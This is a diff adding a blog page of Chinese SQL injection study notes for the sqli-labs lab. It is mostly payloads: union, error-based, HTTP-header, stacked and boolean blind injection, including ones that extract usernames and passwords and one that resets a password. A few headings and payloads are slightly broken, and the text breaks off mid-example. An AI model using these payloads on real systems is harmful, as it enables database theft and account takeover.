@@ -1,0 +1,712 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="Luxf1y">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/09/09/sql-injection/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="SQL INJECTION来源： SQL注入从入门到进阶：sqli-labs靶场通关笔记**** https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39291229&#x2F;article&#x2F;details&#x2F;126750798  sql注入详解***** https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44159028&#x2F;article&#x2F;details&amp;#x">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SQL INJECTION">
+<meta property="og:url" content="http://example.com/2023/09/09/SQL-INJECTION/index.html">
+<meta property="og:site_name" content="Luxf1y&#39;s blog">
+<meta property="og:description" content="SQL INJECTION来源： SQL注入从入门到进阶：sqli-labs靶场通关笔记**** https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_39291229&#x2F;article&#x2F;details&#x2F;126750798  sql注入详解***** https:&#x2F;&#x2F;blog.csdn.net&#x2F;qq_44159028&#x2F;article&#x2F;details&amp;#x">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2023-09-09T06:01:51.000Z">
+<meta property="article:modified_time" content="2023-09-09T06:02:31.397Z">
+<meta property="article:author" content="Luxf1y">
+<meta name="twitter:card" content="summary">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
+    <!--- Page Info-->
+    
+    <title>
+        
+            SQL INJECTION -
+        
+        Luxf1y&#39;s blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/css/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"en"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":true,"link_icon":true},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":[]},"code_block":{"copy":true,"style":"simple","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":true,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Welcome to Luxf1y's blog","subtitle":{"text":["To The Stars"],"hitokoto":{"enable":true,"api":"https://v1.hitokoto.cn/?c=b"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":false,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/luyifei1017","bilibili":"https://space.bilibili.com/382296737?spm_id_from=333.1007.0.0","steam":"https://steamcommunity.com/profiles/76561198314990237/"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.4.4","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/9/8 12:0:0"};
+    Global.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    Global.data_config = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="http://example.com/">
+                
+                Luxf1y&#39;s blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title">
+            
+                <h1 class="article-title-regular">SQL INJECTION</h1>
+            
+            </div>
+            
+                    
+        
+        
+            <div class="article-header">
+                <div class="avatar">
+                    <img src="/images/astralis.jpg">
+                </div>
+                <div class="info">
+                    <div class="author">
+                        <span class="name">Luxf1y</span>
+                        
+                            <span class="author-label">Lv1</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-09-09 14:01:51</span>
+        <span class="mobile">2023-09-09 14:01:51</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-09-09 14:02:31</span>
+            <span class="mobile">2023-09-09 14:02:31</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body">
+            <h1 id="SQL-INJECTION"><a href="#SQL-INJECTION" class="headerlink" title="SQL INJECTION"></a>SQL INJECTION</h1><p><em><strong>来源：</strong></em></p>
+<p><strong><strong>SQL注入从入门到进阶：sqli-labs靶场通关笔记</strong></strong>****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_39291229/article/details/126750798">https://blog.csdn.net/qq_39291229&#x2F;article&#x2F;details&#x2F;126750798 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>sql注入详解</strong></strong>*****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/114325805">https://blog.csdn.net/qq_44159028&#x2F;article&#x2F;details&#x2F;114325805 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>详解“ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;‘ ‘–+  ”</strong></strong>****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_51756263/article/details/125706971">https://blog.csdn.net/m0_51756263&#x2F;article&#x2F;details&#x2F;125706971 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>报错注入是什么？一看你就明白了。报错注入原理+步骤+实战案例</strong></strong>*****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/123416521">https://blog.csdn.net/wangyuxiang946/article/details/123416521 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>[工具使用]SqlMap</strong></strong>*****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/m0_46363249/article/details/119975790">https://blog.csdn.net/m0_46363249&#x2F;article&#x2F;details&#x2F;119975790 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>windows下安装sqlmap 详细教程</strong></strong>*****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44953600/article/details/108961778">https://blog.csdn.net/weixin_44953600&#x2F;article&#x2F;details&#x2F;108961778 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><strong><strong>sql注入getshell的几种方式</strong></strong>****</p>
+<p><a class="link" target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/116274542">https://blog.csdn.net/qq_44159028&#x2F;article&#x2F;details&#x2F;116274542 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h3 id="一、联合查询-union注入"><a href="#一、联合查询-union注入" class="headerlink" title="一、联合查询(union注入)"></a>一、<strong><strong>联合查询(union注入)</strong></strong></h3><pre><code>   联合查询适合于有显示位的注入，即页面某个位置会根据我们输入的数据的变化而变化
+</code></pre>
+<p><em><strong>1、查看回显</strong></em>  </p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> </span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>2、判断类型</strong></em> </p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span><span class="number">2</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>3、构造闭合</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and 1=1 -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>4、查询字段数</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 1 -- q</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">5</span> <span class="comment">-- q</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 -- q</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span> <span class="comment">-- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>5、显位</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,3 -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>6、爆库</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; union select 1,2,database() -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>7、爆表</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; union select 1,2,table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>8、爆列</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; union select 1,2,column_name from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>emails<span class="string">&#x27; -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>9、爆值</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">100</span><span class="string">&#x27; union select 1,2,id from emails -- q</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="二、报错注入"><a href="#二、报错注入" class="headerlink" title="二、报错注入"></a><strong><strong>二、报错注入</strong></strong></h3><pre><code>   报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。
+
+   报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。
+</code></pre>
+<p><em><strong>1、group by 重复键冲</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>example</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>),concat((<span class="keyword">select</span> 查询的内容 <span class="keyword">from</span> information_schema.tables limit <span class="number">0</span>,<span class="number">1</span>),<span class="built_in">floor</span>(rand()<span class="operator">*</span><span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>查数据库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) --+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>2、updatexml() 函数</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>example</span><br><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(需要查询的内容),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>)</span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br><span class="line"><span class="string">//爆表(如果要看第二行则，limit1,1（第一行的往下一行，不包括第一行，即显示第二行），看第三行则limit2,1。以这个方法获取第四个表为users)</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span>),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>爆列</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select column_name from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27; and table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br><span class="line"><span class="string">//爆值</span></span><br><span class="line"><span class="string">?id=1&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(<span class="keyword">select</span> group_concat(username,&quot;--&quot;,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span> ),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>2. extractvalue() 函数</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>爆库</span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and extractvalue(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;)) --+</span></span><br><span class="line"><span class="string">//后续内容与upadatexml()一致</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="三、http头注入"><a href="#三、http头注入" class="headerlink" title="三、http头注入"></a>三<strong><strong>、http头注入</strong></strong></h3><pre><code>   常见的sql注入一般是通过请求参数或者表单进行注入，而HTTP头部注入是通过HTTP协议头部字段值进行注入。http头注入常存在于以下地方
+</code></pre>
+<p><strong>产生注入的条件</strong>：</p>
+<ul>
+<li><p>能够对请求头消息进行修改</p>
+</li>
+<li><p>修改的请求头信息能够带入数据库进行查询</p>
+</li>
+<li><p>数据库没有对输入的请求信息做过滤</p>
+<pre><code>http头注入有：**User-Agent注入、cookie注入、Referer注入、X-Forwarded-For 注入**
+
+手法与报错注入类似，在判断注入点后，采用报错注入函数获取当前数据库名以及后续所有。具体方法为先使用burpsuite抓包后，在各个值后进行判断。
+</code></pre>
+</li>
+</ul>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(database()),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) and &#x27;</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select table_name from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; limit 0,1),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">and</span> updatexml(<span class="number">1</span>,concat(<span class="string">&#x27;^&#x27;</span>,(<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span> <span class="keyword">and</span> table_schema<span class="operator">=</span><span class="string">&#x27;security&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span> ),<span class="string">&#x27;^&#x27;</span>),<span class="number">1</span>) <span class="comment">--+</span></span><br><span class="line"><span class="string">&#x27; and updatexml(1,concat(&#x27;</span><span class="operator">^</span><span class="string">&#x27;,(select group_concat(username,&quot;--&quot;,password) from users limit 0,1 ),&#x27;</span><span class="operator">^</span><span class="string">&#x27;),1) --+</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="四、宽字节注入"><a href="#四、宽字节注入" class="headerlink" title="四、宽字节注入"></a>四<strong><strong>、宽字节注入</strong></strong></h3><pre><code>   跳过，具体看[https://blog.csdn.net/qq_44159028/article/details/114325805](https://blog.csdn.net/qq_44159028/article/details/114325805)
+</code></pre>
+<h3 id="五、宽字节注入"><a href="#五、宽字节注入" class="headerlink" title="五、宽字节注入"></a>五<strong><strong>、宽字节注入</strong></strong></h3><pre><code>   堆叠查询也叫堆叠注入，在SQL中，分号（;）是用来表示一条sql语句的结束。试想一下我们在 ; 结束一个sql语句后继续构造下一条语句，会不会一起执行？因此这个想法也就造就了堆叠注入。而union injection（联合注入）也是将两条语句合并在一起，两者之间有什么区别么？区别就在于union 或者union all执行的语句类型是有限的，可以用来执行查询语句，而堆叠注入可以执行的是任意的语句。
+</code></pre>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">	</span><br><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27;;update users set password=&#x27;</span><span class="number">123456</span><span class="string">&#x27; where id=1; --+</span></span><br><span class="line"><span class="string">//更新id=1的用户密码为123456</span></span><br></pre></td></tr></table></figure></div>
+
+<h3 id="六、二阶注入"><a href="#六、二阶注入" class="headerlink" title="六、二阶注入"></a>六<strong><strong>、二阶注入</strong></strong></h3><pre><code>   二次注入漏洞是一种在Web应用程序中广泛存在的安全漏洞形式。相对于一次注入漏洞而言，二次注入漏洞更难以被发现，但是它却具有与—次注入攻击漏洞相同的攻击威力。
+
+   黑客通过构造数据的形式，在浏览器或者其他软件中提交HTTP数据报文请求到服务端进行处理，提交的数据报文请求中可能包含了黑客构造的SQL语句或者命令。
+</code></pre>
+<p>服务端应用程序会将黑客提交的数据信息进行存储，通常是保存在数据库中，保存的数据信息的主要作用是为应用程序执行其他功能提供原始输入数据并对客户端请求做出响应。<br>黑客向服务端发送第二个与第一次不相同的请求数据信息。<br>服务端接收到黑客提交的第二个请求信息后，为了处理该请求，服务端会查询数据库中已经存储的数据信息并处理，从而导致黑客在第一次请求中构造的SQL语句或者命令在服务端环境中执行。<br>服务端返回执行的处理结果数据信息，黑客可以通过返回的结果数据信息判断二次注入漏洞利用是否成功<br>       总结，二次注入就是由于将数据存储进数据库中时未做好过滤，先提交构造好的特殊字符请求存储进数据库，然后提交第二次请求时与第一次提交进数据库中的字符发生了作用，形成了一条新的sql语句导致被执行。</p>
+<h3 id="七、sql注入getshell的几种方法"><a href="#七、sql注入getshell的几种方法" class="headerlink" title="七、sql注入getshell的几种方法"></a>七<strong><strong>、sql注入getshell的几种方法</strong></strong></h3><pre><code>    跳过，具体看[https://blog.csdn.net/qq_44159028/article/details/116274542](https://blog.csdn.net/qq_44159028/article/details/116274542)
+</code></pre>
+<h3 id="八、布尔盲注"><a href="#八、布尔盲注" class="headerlink" title="八、布尔盲注"></a>八、<strong><strong>布尔盲注</strong></strong></h3><p>即在页面没有错误回显时完成的注入攻击。此时我们输入的语句让页面呈现出两种状态，相当于true和false，根据这两种状态可以判断我们输入的语句是否查询成功。以less-8关为例</p>
+<p><em><strong>1、判断数据库类型</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Mysql数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(selectfrom information_schema.tables) --+</span></span><br><span class="line"><span class="string">//判断是否是 access数据库</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> <span class="keyword">exists</span>(selectfrom msysobjects) <span class="comment">--+</span></span><br><span class="line"><span class="operator">/</span><span class="operator">/</span>判断是否是 Sqlserver数据库</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and exists(select*from sysobjects) --+</span></span><br></pre></td></tr></table></figure></div>
+
+<p><em><strong>2、判断当前数据库名</strong></em></p>
+<div class="highlight-container" data-rel="Sql"><figure class="iseeu highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>：判断当前数据库的长度，利用二分法</span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;5 --+  //正常显示</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">10</span> <span class="comment">--+  //不显示任何数据</span></span><br><span class="line">http:<span class="operator">/</span><span class="operator">/</span><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span><span class="operator">/</span>sqli<span class="operator">/</span>Less<span class="number">-5</span><span class="operator">/</span>?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; and length(database())&gt;7 --+  //正常显示</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli/Less-5/?id=1&#x27;</span> <span class="keyword">and</span> length(database())<span class="operator">&gt;</span><span class="number">8</span> <span class="comment">--+  //不显示任何数据</span></span><br><span class="line"></span><br><span class="line">大于<span class="number">7</span>正常显示，大于<span class="number">8</span>不显示，说明大于<span class="number">7</span>而不大于<span class="number">8</span>，所以可知当前数据库长度为<span class="number">8</span>个字符</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>：判断当前数据库的字符,和上面的方法一样，利用二分法依次判断</span><br><span class="line"><span class="operator">/</span><span 